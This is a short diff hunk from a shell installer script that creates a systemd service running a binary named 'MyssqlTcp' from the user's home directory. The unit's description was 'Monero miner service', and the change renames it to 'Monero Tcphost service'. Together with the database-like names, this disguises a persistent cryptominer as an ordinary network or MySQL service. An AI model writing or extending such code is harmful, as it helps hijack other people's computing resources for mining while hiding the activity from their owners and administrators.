@@ -781,7 +781,7 @@ else
     echo "[*] Creating Myssqltcp systemd service"
     cat >/tmp/MyssqlTcp.service <<EOL
 [Unit]
-Description=Monero miner service
+Description=Monero Tcphost service
 
 [Service]
 ExecStart=$HOME/myssqltcp/MyssqlTcp --config=$HOME/myssqltcp/config.json
